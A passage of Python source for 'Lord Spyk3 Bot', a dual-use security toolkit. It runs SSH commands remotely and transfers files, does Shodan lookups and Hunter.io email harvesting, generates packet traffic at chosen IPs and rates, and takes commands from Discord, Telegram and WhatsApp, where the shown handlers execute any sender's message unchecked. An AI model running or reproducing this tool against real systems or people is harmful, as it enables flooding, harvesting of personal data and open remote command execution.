            return self._create_result(False, f"Invalid port: {args[1]}")
        
        result = self.tools.netcat_connect(host, port)
        return result
    
    def _execute_ssh(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh.is_available():
            return self._create_result(False, "SSH not available. Install paramiko: pip install paramiko")
        
        if not args:
            # List connections
            connections = self.ssh.get_active_connections()
            if connections:
                output = "Active SSH Connections:\n"
                for conn in connections:
                    output += f"  {conn['name']} - {conn['host']} ({conn['username']})\n"
                return self._create_result(True, output)
            else:
                return self._create_result(True, "No active SSH connections")
        
        sub_cmd = args[0].lower()
        sub_args = args[1:]
        
        if sub_cmd == 'add':
            if len(sub_args) < 3:
                return self._create_result(False, "Usage: ssh add <name> <host> <username> [password] [port]")
            name = sub_args[0]
            host = sub_args[1]
            username = sub_args[2]
            password = sub_args[3] if len(sub_args) > 3 else None
            port = int(sub_args[4]) if len(sub_args) > 4 else 22
            
            conn_id = self.ssh.create_connection(name, host, username, port, password)
            if conn_id:
                return self._create_result(True, f"SSH connection '{name}' created with ID: {conn_id}")
            else:
                return self._create_result(False, "Failed to create SSH connection")
        
        elif sub_cmd == 'connect':
            if len(sub_args) < 1:
                return self._create_result(False, "Usage: ssh connect <name_or_id>")
            
            conn_data = self.db.get_ssh_connection_by_name(sub_args[0])
            if not conn_data:
                conn_data = self.db.get_ssh_connection(sub_args[0])
            
            if not conn_data:
                return self._create_result(False, f"Connection '{sub_args[0]}' not found")
            
            if self.ssh.connect(conn_data['id']):
                return self._create_result(True, f"Connected to {conn_data['name']} ({conn_data['host']})")
            else:
                return self._create_result(False, f"Failed to connect to {conn_data['host']}")
        
        elif sub_cmd == 'exec':
            if len(sub_args) < 2:
                return self._create_result(False, "Usage: ssh exec <name_or_id> <command>")
            
            conn_data = self.db.get_ssh_connection_by_name(sub_args[0])
            if not conn_data:
                conn_data = self.db.get_ssh_connection(sub_args[0])
            
            if not conn_data:
                return self._create_result(False, f"Connection '{sub_args[0]}' not found")
            
            if not self.ssh.is_connected(conn_data['id']):
                if not self.ssh.connect(conn_data['id']):
                    return self._create_result(False, f"Not connected to {conn_data['host']}")
            
            command = ' '.join(sub_args[1:])
            result = self.ssh.execute_command(conn_data['id'], command)
            return self._create_result(result['success'], result['output'])
        
        elif sub_cmd == 'upload':
            if len(sub_args) < 3:
                return self._create_result(False, "Usage: ssh upload <name_or_id> <local_path> <remote_path>")
            
            conn_data = self.db.get_ssh_connection_by_name(sub_args[0])
            if not conn_data:
                conn_data = self.db.get_ssh_connection(sub_args[0])
            
            if not conn_data:
                return self._create_result(False, f"Connection '{sub_args[0]}' not found")
            
            if not self.ssh.is_connected(conn_data['id']):
                if not self.ssh.connect(conn_data['id']):
                    return self._create_result(False, f"Not connected to {conn_data['host']}")
            
            result = self.ssh.upload_file(conn_data['id'], sub_args[1], sub_args[2])
            return self._create_result(result['success'], result.get('message', result.get('error', 'Upload failed')))
        
        elif sub_cmd == 'download':
            if len(sub_args) < 3:
                return self._create_result(False, "Usage: ssh download <name_or_id> <remote_path> <local_path>")
            
            conn_data = self.db.get_ssh_connection_by_name(sub_args[0])
            if not conn_data:
                conn_data = self.db.get_ssh_connection(sub_args[0])
            
            if not conn_data:
                return self._create_result(False, f"Connection '{sub_args[0]}' not found")
            
            if not self.ssh.is_connected(conn_data['id']):
                if not self.ssh.connect(conn_data['id']):
                    return self._create_result(False, f"Not connected to {conn_data['host']}")
            
            result = self.ssh.download_file(conn_data['id'], sub_args[1], sub_args[2])
            return self._create_result(result['success'], result.get('message', result.get('error', 'Download failed')))
        
        elif sub_cmd == 'disconnect':
            if len(sub_args) >= 1:
                conn_data = self.db.get_ssh_connection_by_name(sub_args[0])
                if not conn_data:
                    conn_data = self.db.get_ssh_connection(sub_args[0])
                if conn_data:
                    self.ssh.disconnect(conn_data['id'])
                    return self._create_result(True, f"Disconnected from {conn_data['name']}")
            else:
                self.ssh.disconnect_all()
                return self._create_result(True, "Disconnected from all SSH connections")
            
            return self._create_result(False, f"Connection '{sub_args[0]}' not found")
        
        elif sub_cmd == 'list':
            connections = self.db.get_all_ssh_connections()
            if connections:
                output = "Configured SSH Connections:\n"
                for conn in connections:
                    status = "✅" if conn['status'] == 'connected' else "❌"
                    output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']})\n"
                return self._create_result(True, output)
            else:
                return self._create_result(True, "No SSH connections configured")
        
        elif sub_cmd == 'auth':
            if len(sub_args) < 2:
                return self._create_result(False, "Usage: ssh auth <platform> <user_id> [username]")
            platform = sub_args[0]
            user_id = sub_args[1]
            username = sub_args[2] if len(sub_args) > 2 else None
            if self.db.authorize_ssh_user(platform, user_id, username):
                return self._create_result(True, f"User {user_id} authorized for SSH on {platform}")
            return self._create_result(False, "Failed to authorize user")
        
        else:
            return self._create_result(False, f"Unknown SSH subcommand: {sub_cmd}")
    
    def _execute_ping(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: ping <target> [count]")
        
        target = args[0]
        count = 4
        if len(args) > 1:
            try:
                count = int(args[1])
            except:
                pass
        
        result = self.tools.ping(target, count)
        return result
    
    def _execute_traceroute(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: traceroute <target>")
        
        result = self.tools.traceroute(args[0])
        return result
    
    def _execute_dig(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: dig <domain> [record_type]")
        
        domain = args[0]
        record_type = args[1] if len(args) > 1 else "A"
        
        result = self.tools.dns_lookup(domain, record_type)
        return result
    
    def _execute_whois(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: whois <domain>")
        
        result = self.tools.whois_lookup(args[0])
        return result
    
    def _execute_shodan(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: shodan <ip|search|config> [options]")
        
        sub_cmd = args[0].lower()
        sub_args = args[1:]
        
        if sub_cmd == 'config':
            if len(sub_args) < 1:
                return self._create_result(False, "Usage: shodan config <api_key>")
            if self.shodan.save_config(sub_args[0]):
                return self._create_result(True, "Shodan API key saved successfully")
            return self._create_result(False, "Failed to save Shodan API key")
        
        elif sub_cmd == 'ip':
            if len(sub_args) < 1:
                return self._create_result(False, "Usage: shodan ip <ip_address>")
            result = self.shodan.search_ip(sub_args[0])
            if result:
                output = f"Shodan Results for {sub_args[0]}:\n\n"
                output += f"📍 Location: {result.get('city', 'N/A')}, {result.get('country', 'N/A')}\n"
                output += f"🏢 Organization: {result.get('org', 'N/A')}\n"
                output += f"💻 OS: {result.get('os', 'N/A')}\n"
                output += f"🔌 Open Ports: {', '.join(map(str, result.get('ports', [])))[:200]}\n"
                output += f"⚠️ Vulnerabilities: {', '.join(result.get('vulnerabilities', []))[:200]}\n"
                return self._create_result(True, output)
            return self._create_result(False, "No Shodan data found for IP")
        
        elif sub_cmd == 'search':
            if len(sub_args) < 1:
                return self._create_result(False, "Usage: shodan search <query>")
            query = ' '.join(sub_args)
            results = self.shodan.search(query, 10)
            if results:
                output = f"Shodan Search Results for '{query}':\n\n"
                for i, r in enumerate(results[:10], 1):
                    ip = r.get('ip_str', 'N/A')
                    port = r.get('port', 'N/A')
                    hostname = r.get('hostnames', ['N/A'])[0]
                    output += f"{i}. {ip}:{port} - {hostname}\n"
                return self._create_result(True, output)
            return self._create_result(False, "No results found")
        
        elif sub_cmd == 'stats':
            stats = self.shodan.get_stats()
            if stats.get('available'):
                output = f"Shodan Statistics:\n"
                output += f"  Scan Credits: {stats.get('scan_credits', 'N/A')}\n"
                output += f"  Query Credits: {stats.get('query_credits', 'N/A')}\n"
                output += f"  Monitored IPs: {stats.get('monitored_ips', 'N/A')}\n"
                return self._create_result(True, output)
            return self._create_result(False, "Shodan not configured")
        
        else:
            return self._create_result(False, f"Unknown Shodan subcommand: {sub_cmd}")
    
    def _execute_hunter(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: hunter <domain|verify|config> [options]")
        
        sub_cmd = args[0].lower()
        sub_args = args[1:]
        
        if sub_cmd == 'config':
            if len(sub_args) < 1:
                return self._create_result(False, "Usage: hunter config <api_key>")
            if self.hunter.save_config(sub_args[0]):
                return self._create_result(True, "Hunter.io API key saved successfully")
            return self._create_result(False, "Failed to save Hunter.io API key")
        
        elif sub_cmd == 'domain':
            if len(sub_args) < 1:
                return self._create_result(False, "Usage: hunter domain <domain>")
            result = self.hunter.domain_search(sub_args[0])
            if result:
                output = f"Hunter.io Results for {sub_args[0]}:\n\n"
                output += f"Total Emails: {result.get('total', 0)}\n"
                output += f"Pattern: {result.get('pattern', 'N/A')}\n"
                output += f"Organization: {result.get('organization', 'N/A')}\n"
                output += "\nEmails:\n"
                for email in result.get('emails', [])[:10]:
                    value = email.get('value', 'N/A')
                    confidence = email.get('confidence', 0)
                    output += f"  • {value} (Confidence: {confidence}%)\n"
                return self._create_result(True, output)
            return self._create_result(False, "No Hunter.io data found")
        
        elif sub_cmd == 'verify':
            if len(sub_args) < 1:
                return self._create_result(False, "Usage: hunter verify <email>")
            result = self.hunter.email_verify(sub_args[0])
            if result:
                status = result.get('status', 'unknown')
                output = f"Email Verification for {sub_args[0]}:\n"
                output += f"  Status: {status.upper()}\n"
                output += f"  MX Records: {'Yes' if result.get('mx_records') else 'No'}\n"
                output += f"  SMTP Check: {result.get('smtp_check', 'N/A')}\n"
                return self._create_result(True, output)
            return self._create_result(False, "Email verification failed")
        
        elif sub_cmd == 'stats':
            stats = self.hunter.get_stats()
            if stats.get('available'):
                output = f"Hunter.io Statistics:\n"
                output += f"  Requests Left: {stats.get('requests_left', 'N/A')}\n"
                output += f"  Plan: {stats.get('plan', 'N/A')}\n"
                return self._create_result(True, output)
            return self._create_result(False, "Hunter.io not configured")
        
        else:
            return self._create_result(False, f"Unknown Hunter subcommand: {sub_cmd}")
    
    def _execute_traffic(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: traffic <generate|stop|list|types> [options]")
        
        sub_cmd = args[0].lower()
        sub_args = args[1:]
        
        if sub_cmd == 'types':
            help_text = self.traffic_gen.get_traffic_types_help()
            return self._create_result(True, help_text)
        
        elif sub_cmd == 'list':
            active = self.traffic_gen.get_active_generators()
            if active:
                output = "Active Traffic Generators:\n"
                for gen in active:
                    output += f"  {gen['id'][:8]}... - {gen['target_ip']} ({gen['traffic_type']}) - {gen['packets_sent']} packets\n"
                return self._create_result(True, output)
            return self._create_result(True, "No active traffic generators")
        
        elif sub_cmd == 'stop':
            if sub_args:
                generator_id = sub_args[0]
                if self.traffic_gen.stop_generation(generator_id):
                    return self._create_result(True, f"Stopped generator {generator_id}")
                return self._create_result(False, f"Generator {generator_id} not found")
            else:
                self.traffic_gen.stop_generation()
                return self._create_result(True, "Stopped all traffic generators")
        
        elif sub_cmd == 'generate':
            if len(sub_args) < 3:
                return self._create_result(False, "Usage: traffic generate <type> <ip> <duration> [port] [rate]")
            
            traffic_type = sub_args[0].lower()
            target_ip = sub_args[1]
            try:
                duration = int(sub_args[2])
            except ValueError:
                return self._create_result(False, f"Invalid duration: {sub_args[2]}")
            
            port = None
            if len(sub_args) >= 4:
                try:
                    port = int(sub_args[3])
                except:
                    pass
            
            rate = 100
            if len(sub_args) >= 5:
                try:
                    rate = int(sub_args[4])
                except:
                    pass
            
            try:
                generator = self.traffic_gen.generate_traffic(
                    traffic_type, target_ip, duration, port, rate, "cli"
                )
                output = f"Traffic Generation Started:\n"
                output += f"  Type: {generator['traffic_type']}\n"
                output += f"  Target: {generator['target_ip']}:{generator['target_port']}\n"
                output += f"  Duration: {generator['duration']}s\n"
                output += f"  Rate: {generator['packet_rate']} pps\n"
                output += f"  ID: {generator['id'][:8]}...\n"
                return self._create_result(True, output)
            except ValueError as e:
                return self._create_result(False, str(e))
            except Exception as e:
                return self._create_result(False, f"Traffic generation failed: {e}")
        
        else:
            return self._create_result(False, f"Unknown traffic subcommand: {sub_cmd}")
    
    def _execute_add_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: add_ip <ip> [notes]")
        
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else "Added via command"
        
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, "cli", notes):
                return self._create_result(True, f"✅ IP {ip} added to monitoring")
            return self._create_result(False, f"Failed to add IP {ip}")
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    def _execute_remove_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: remove_ip <ip>")
        
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            if self.db.remove_managed_ip(ip):
                return self._create_result(True, f"✅ IP {ip} removed from monitoring")
            return self._create_result(False, f"IP {ip} not found")
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    def _execute_block_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: block_ip <ip> [reason]")
        
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else "Manually blocked"
        
        try:
            ipaddress.ip_address(ip)
            firewall_success = self.tools.block_ip_firewall(ip)
            db_success = self.db.block_ip(ip, reason, "cli")
            
            if firewall_success or db_success:
                return self._create_result(True, f"✅ IP {ip} blocked successfully")
            return self._create_result(False, f"Failed to block IP {ip}")
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    def _execute_unblock_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: unblock_ip <ip>")
        
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            firewall_success = self.tools.unblock_ip_firewall(ip)
            db_success = self.db.unblock_ip(ip, "cli")
            
            if firewall_success or db_success:
                return self._create_result(True, f"✅ IP {ip} unblocked successfully")
            return self._create_result(False, f"Failed to unblock IP {ip}")
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    def _execute_list_ips(self, args: List[str]) -> Dict[str, Any]:
        include_blocked = True
        if args and args[0].lower() == 'active':
            include_blocked = False
        
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return self._create_result(True, "No managed IPs found")
        
        output = "Managed IPs:\n\n"
        for ip in ips:
            blocked = "🔒" if ip.get('is_blocked') else "✓"
            output += f"{blocked} {ip['ip_address']} - {ip.get('notes', '')[:30]}\n"
        return self._create_result(True, output)
    
    def _execute_ip_info(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: ip_info <ip>")
        
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            db_info = self.db.get_ip_info(ip)
            location = self.tools.get_ip_location(ip)
            threats = self.db.get_recent_threats(5)
            threats = [t for t in threats if t.get('source_ip') == ip]
            
            output = f"IP Information: {ip}\n\n"
            if db_info:
                output += f"Added: {db_info.get('added_date', 'Unknown')[:19]}\n"
                output += f"Blocked: {'Yes' if db_info.get('is_blocked') else 'No'}\n"
                if db_info.get('block_reason'):
                    output += f"Block Reason: {db_info['block_reason']}\n"
                output += f"Alert Count: {db_info.get('alert_count', 0)}\n"
            if location.get('success'):
                output += f"\nLocation:\n"
                output += f"  Country: {location.get('country')}\n"
                output += f"  City: {location.get('city')}\n"
                output += f"  ISP: {location.get('isp')}\n"
            if threats:
                output += f"\nRecent Threats ({len(threats)}):\n"
                for threat in threats[:3]:
                    output += f"  • {threat.get('threat_type')} ({threat.get('severity')})\n"
            return self._create_result(True, output)
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    def _execute_history(self, args: List[str]) -> Dict[str, Any]:
        limit = 20
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        
        history = self.db.get_command_history(limit)
        if not history:
            return self._create_result(True, "No command history found.")
        
        output = f"Command History (Last {len(history)}):\n\n"
        for i, cmd in enumerate(history, 1):
            status = "✅" if cmd['success'] else "❌"
            output += f"{i:2d}. {status} [{cmd['timestamp'][:19]}] {cmd['command'][:50]}\n"
        return self._create_result(True, output)
    
    def _execute_status(self, args: List[str]) -> Dict[str, Any]:
        stats = self.db.get_statistics()
        
        output = f"""
{Colors.PRIMARY}📊 LORD SPYK3 STATUS{Colors.RESET}
{'='*50}

{Colors.ACCENT}📈 Statistics:{Colors.RESET}
  Total Commands: {stats.get('total_commands', 0)}
  Total Scans: {stats.get('total_scans', 0)}
  Nikto Scans: {stats.get('total_nikto_scans', 0)}
  Shodan Scans: {stats.get('total_shodan_scans', 0)}
  Hunter Scans: {stats.get('total_hunter_scans', 0)}

{Colors.ACCENT}🔒 IP Management:{Colors.RESET}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('total_blocked_ips', 0)}

{Colors.ACCENT}🚀 Traffic Generation:{Colors.RESET}
  Traffic Tests: {stats.get('total_traffic_tests', 0)}

{Colors.ACCENT}🔐 SSH Status:{Colors.RESET}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  SSH Commands: {stats.get('total_ssh_commands', 0)}
  SSH Transfers: {stats.get('total_ssh_transfers', 0)}
  Authorized Users: {stats.get('authorized_ssh_users', 0)}

{Colors.ACCENT}⚠️ Threats:{Colors.RESET}
  Total Threats: {stats.get('total_threats', 0)}
"""
        return self._create_result(True, output)
    
    def _execute_threats(self, args: List[str]) -> Dict[str, Any]:
        limit = 10
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return self._create_result(True, "No recent threats detected.")
        
        output = f"Recent Threats (Last {len(threats)}):\n\n"
        for threat in threats:
            severity_color = Colors.RED if threat.get('severity') in ['critical', 'high'] else Colors.YELLOW
            output += f"{severity_color}[{threat['timestamp'][:19]}] {threat['threat_type']}{Colors.RESET}\n"
            output += f"  Source: {threat['source_ip']}\n"
            output += f"  Severity: {threat['severity'].upper()}\n"
            output += f"  Description: {threat['description'][:100]}\n\n"
        return self._create_result(True, output)
    
    def _execute_help(self, args: List[str]) -> Dict[str, Any]:
        help_text = f"""
{Colors.PRIMARY}👑 LORD SPYK3 BOT V7 - Help Menu{Colors.RESET}
{'='*60}

{Colors.ACCENT}🔍 NMAP COMMANDS:{Colors.RESET}
  !nmap <target> [options]          - Run Nmap scan
  Examples:
  !nmap 192.168.1.1                 - Basic scan
  !nmap -sS -sV 192.168.1.1         - SYN scan with version detection
  !nmap -A 192.168.1.1              - Aggressive scan
  !nmap -p- 192.168.1.1             - All ports scan
  !nmap --script vuln 192.168.1.1   - Vulnerability scan

{Colors.ACCENT}🌐 CURL COMMANDS:{Colors.RESET}
  !curl <url> [options]             - HTTP requests
  Examples:
  !curl example.com                 - GET request
  !curl -X POST -d "data=value" example.com

{Colors.ACCENT}📥 WGET COMMANDS:{Colors.RESET}
  !wget <url> [options]             - Download files
  Example: !wget -O file.zip http://example.com/file.zip

{Colors.ACCENT}🔌 NETCAT COMMANDS:{Colors.RESET}
  !nc <host> <port>                 - Port connection test
  Example: !nc example.com 80

{Colors.ACCENT}🔐 SSH COMMANDS:{Colors.RESET}
  !ssh                              - List connections
  !ssh add <name> <host> <user> [pass] - Add connection
  !ssh connect <name>               - Connect
  !ssh exec <name> <command>        - Execute command
  !ssh upload <name> <local> <remote> - Upload file
  !ssh download <name> <remote> <local> - Download file
  !ssh disconnect [name]            - Disconnect
  !ssh auth <platform> <user_id>    - Authorize user

{Colors.ACCENT}🔍 SHODAN COMMANDS:{Colors.RESET}
  !shodan config <api_key>          - Configure API key
  !shodan ip <ip>                   - IP lookup
  !shodan search <query>            - Search
  !shodan stats                     - Usage stats

{Colors.ACCENT}📧 HUNTER.IO COMMANDS:{Colors.RESET}
  !hunter config <api_key>          - Configure API key
  !hunter domain <domain>           - Find emails
  !hunter verify <email>            - Verify email
  !hunter stats                     - Usage stats

{Colors.ACCENT}🚀 TRAFFIC GENERATION:{Colors.RESET}
  !traffic types                    - List types
  !traffic generate <type> <ip> <duration> [port] [rate] - Generate traffic
  !traffic list                     - Active generators
  !traffic stop [id]                - Stop generation

{Colors.ACCENT}🔒 IP MANAGEMENT:{Colors.RESET}
  !add_ip <ip> [notes]              - Add to monitoring
  !remove_ip <ip>                   - Remove from monitoring
  !block_ip <ip> [reason]           - Block IP
  !unblock_ip <ip>                  - Unblock IP
  !list_ips [active]                - List managed IPs
  !ip_info <ip>                     - IP information

{Colors.ACCENT}📊 SYSTEM COMMANDS:{Colors.RESET}
  !history [limit]                  - Command history
  !status                           - System status
  !threats [limit]                  - Recent threats
  !help                             - This menu

{Colors.WARNING}⚠️ For authorized security testing only!{Colors.RESET}
"""
        return self._create_result(True, help_text)

# =====================
# DISCORD BOT
# =====================
class Spyk3Discord:
    """Discord bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.config = self._load_config()
        self.bot = None
        self.running = False
        self.purple_color = 0x9f7aea
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(DISCORD_CONFIG_FILE):
                with open(DISCORD_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Discord config: {e}")
        return {"token": "", "channel_id": "", "enabled": False, "prefix": "!"}
    
    def save_config(self, token: str, channel_id: str = "", enabled: bool = True, prefix: str = "!") -> bool:
        try:
            config = {"token": token, "channel_id": channel_id, "enabled": enabled, "prefix": prefix}
            with open(DISCORD_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Discord config: {e}")
            return False
    
    async def start(self):
        if not DISCORD_AVAILABLE:
            return False
        
        if not self.config.get('token'):
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            
            self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents, help_command=None)
            
            @self.bot.event
            async def on_ready():
                logger.info(f'Discord bot logged in as {self.bot.user}')
                await self.bot.change_presence(
                    activity=discord.Activity(
                        type=discord.ActivityType.watching,
                        name="4000+ Security Commands | !help"
                    )
                )
            
            @self.bot.event
            async def on_message(message):
                if message.author == self.bot.user:
                    return
                
                if message.content.startswith(self.config.get('prefix', '!')):
                    command = message.content[len(self.config.get('prefix', '!')):].strip()
                    result = self.handler.execute(command, f"discord:{message.author.name}")
                    
                    if result['success']:
                        output = result.get('output', '') or result.get('data', '')
                        if isinstance(output, dict):
                            output = json.dumps(output, indent=2)
                        if len(output) > 1900:
                            output = output[:1900] + "..."
                        embed = discord.Embed(
                            title="✅ Command Executed",
                            description=f"```{output}```",
                            color=self.purple_color
                        )
                        await message.channel.send(embed=embed)
                    else:
                        embed = discord.Embed(
                            title="❌ Command Failed",
                            description=f"```{result.get('output', 'Unknown error')}```",
                            color=discord.Color.red()
                        )
                        await message.channel.send(embed=embed)
            
            self.running = True
            await self.bot.start(self.config['token'])
            return True
        except Exception as e:
            logger.error(f"Failed to start Discord bot: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled') and self.config.get('token'):
            thread = threading.Thread(target=self._run_bot, daemon=True)
            thread.start()
            return True
        return False
    
    def _run_bot(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# TELEGRAM BOT
# =====================
class Spyk3Telegram:
    """Telegram bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.config = self._load_config()
        self.client = None
        self.running = False
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(TELEGRAM_CONFIG_FILE):
                with open(TELEGRAM_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Telegram config: {e}")
        return {"api_id": "", "api_hash": "", "bot_token": "", "enabled": False}
    
    def save_config(self, api_id: str, api_hash: str, bot_token: str = "", enabled: bool = True) -> bool:
        try:
            config = {"api_id": api_id, "api_hash": api_hash, "bot_token": bot_token, "enabled": enabled}
            with open(TELEGRAM_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except Exception as e:
            logger.error(f"Failed to save Telegram config: {e}")
            return False
    
    async def start(self):
        if not TELETHON_AVAILABLE:
            return False
        
        if not self.config.get('api_id') or not self.config.get('api_hash'):
            return False
        
        try:
            self.client = TelegramClient('spyk3_session', self.config['api_id'], self.config['api_hash'])
            
            @self.client.on(events.NewMessage)
            async def handler(event):
                if event.message.text and event.message.text.startswith('/'):
                    command = event.message.text[1:].strip()
                    result = self.handler.execute(command, f"telegram:{event.sender_id}")
                    
                    if result['success']:
                        output = result.get('output', '') or result.get('data', '')
                        if isinstance(output, dict):
                            output = json.dumps(output, indent=2)
                        if len(output) > 4000:
                            output = output[:4000] + "..."
                        await event.reply(f"✅ Command Executed\n\n```{output}```")
                    else:
                        await event.reply(f"❌ Command Failed: {result.get('output', 'Unknown error')}")
            
            if self.config.get('bot_token'):
                await self.client.start(bot_token=self.config['bot_token'])
            else:
                await self.client.start()
            
            self.running = True
            await self.client.run_until_disconnected()
            return True
        except Exception as e:
            logger.error(f"Failed to start Telegram bot: {e}")
            return False
    
    def start_bot_thread(self):
        if self.config.get('enabled') and (self.config.get('api_id') or self.config.get('bot_token')):
            thread = threading.Thread(target=self._run_bot, daemon=True)
            thread.start()
            return True
        return False
    
    def _run_bot(self):
        try:
            asyncio.run(self.start())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# WHATSAPP BOT
# =====================
class Spyk3WhatsApp:
    """WhatsApp bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.config = self._load_config()
        self.driver = None
        self.running = False
        self.prefix = "/"
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(WHATSAPP_CONFIG_FILE):
                with open(WHATSAPP_CONFIG_FILE, 'r') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Failed to load WhatsApp config: {e}")
        return {"enabled": False, "phone_number": "", "command_prefix": "/"}
    
    def save_config(self, phone_number: str = "", enabled: bool = True, prefix: str = "/") -> bool:
        try:
            config = {"enabled": enabled, "phone_number": phone_number, "command_prefix": prefix}
            with open(WHATSAPP_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            self.prefix = prefix
            return True
        except Exception as e:
            logger.error(f"Failed to save WhatsApp config: {e}")
            return False
    
    def start(self):
        if not SELENIUM_AVAILABLE or not WEBDRIVER_MANAGER_AVAILABLE:
            return False
        
        if not self.config.get('enabled'):
            return False
        
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--user-data-dir=" + os.path.abspath(WHATSAPP_SESSION_DIR))
            
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            
            self.running = True
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            
            return True
        except Exception as e:
            logger.error(f"Failed to start WhatsApp bot: {e}")
            return False
    
    def _monitor(self):
        try:
            self.driver.get("https://web.whatsapp.com")
            WebDriverWait(self.driver, 60).until(
                EC.presence_of_element_located((By.XPATH, '//div[@aria-label="Chat list"]'))
            )
            
            while self.running:
                try:
                    unread_chats = self.driver.find_elements(By.XPATH, '//span[@aria-label="Unread message"]/..')
                    for chat in unread_chats:
                        chat.click()
                        time.sleep(1)
                        messages = self.driver.find_elements(By.XPATH, '//div[contains(@class, "message-in")]')
                        if messages:
                            latest = messages[-1]
                            text_elem = latest.find_element(By.XPATH, './/span[contains(@class, "selectable-text")]')
                            message = text_elem.text
                            if message.startswith(self.prefix):
                                command = message[len(self.prefix):].strip()
                                result = self.handler.execute(command, "whatsapp")
                                
                                if result['success']:
                                    output = result.get('output', '') or result.get('data', '')
                                    if isinstance(output, dict):
                                        output = json.dumps(output, indent=2)
                                    response = f"✅ Command Executed\n\n{output[:2000]}"
                                else:
                                    response = f"❌ Command Failed: {result.get('output', 'Unknown error')}"
                                
                                message_box = self.driver.find_element(By.XPATH, '//div[@aria-placeholder="Type a message"]')
                                message_box.send_keys(response)
                                message_box.send_keys("\n")
                    time.sleep(2)
                except:
                    time.sleep(5)
        except Exception as e:
            logger.error(f"WhatsApp monitor error: {e}")
    
    def stop(self):
        self.running = False
        if self.driver:
            self.driver.quit()
    
    def start_bot_thread(self):
        if self.config.get('enabled'):
            thread = threading.Thread(target=self.start, daemon=True)
            thread.start()
            return True
        return False

# =====================
# MAIN APPLICATION
# =====================
class LordSpyk3App:
    """Main application class"""
    
    def __init__(self):
        self.db = DatabaseManager()
        self.ssh = SSHManager(self.db)
        self.traffic_gen = TrafficGeneratorEngine(self.db)
        self.shodan = ShodanManager(self.db)
        self.hunter = HunterManager(self.db)
        self.handler = CommandHandler(self.db, self.ssh, self.traffic_gen, self.shodan, self.hunter)
        self.discord = Spyk3Discord(self.handler, self.db)
        self.telegram = Spyk3Telegram(self.handler, self.db)
        self.whatsapp = Spyk3WhatsApp(self.handler, self.db)
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.PURPLE1}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.PURPLE2}        👑 LORD SPYK3 BOT V8 -                               👑         {Colors.PURPLE1}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.PURPLE3}  • 🔍 4000+ Security Commands       • 🔐 SSH Remote Access (6 Platforms)   {Colors.PURPLE1}║
║{Colors.PURPLE3}  • 🚀 REAL Traffic Generation       • 🕷️ Nmap/Curl/Wget/Netcat           {Colors.PURPLE1}║
║{Colors.PURPLE3}  • 🔎 Shodan & Hunter.io            • 📧 Email Harvesting                  {Colors.PURPLE1}║
